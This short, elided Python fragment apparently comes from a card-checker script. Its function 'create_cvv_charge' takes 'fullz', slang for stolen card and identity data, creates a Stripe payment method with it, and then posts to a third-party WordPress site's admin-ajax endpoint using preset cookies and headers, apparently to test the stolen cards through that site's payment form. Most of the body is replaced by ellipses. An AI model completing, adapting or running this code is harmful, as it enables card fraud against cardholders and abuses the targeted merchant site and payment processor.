...
async def create_cvv_charge(fullz , session):
    ...
    response = await session.post('https://api.stripe.com/v1/payment_methods', data=oa)
    ...
    responsey = await session.post('https://needhelped.com/wp-admin/admin-ajax.php', cookies=kkie, headers=rd, data=co)
